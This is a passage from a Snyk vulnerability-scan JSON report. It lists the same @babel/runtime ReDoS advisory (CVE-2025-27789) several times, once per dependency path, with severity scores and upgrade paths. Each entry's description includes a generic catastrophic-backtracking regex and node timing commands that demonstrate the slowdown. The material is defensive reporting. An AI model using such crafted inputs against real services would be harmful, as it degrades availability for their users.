        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-router-dom@5.2.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-router-dom@5.2.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-transition-group@4.3.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-transition-group@4.3.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "history@4.10.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "history@4.10.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-router-dom@5.2.0",
          "history@4.10.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-router-dom@5.2.0",
          "history@4.10.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
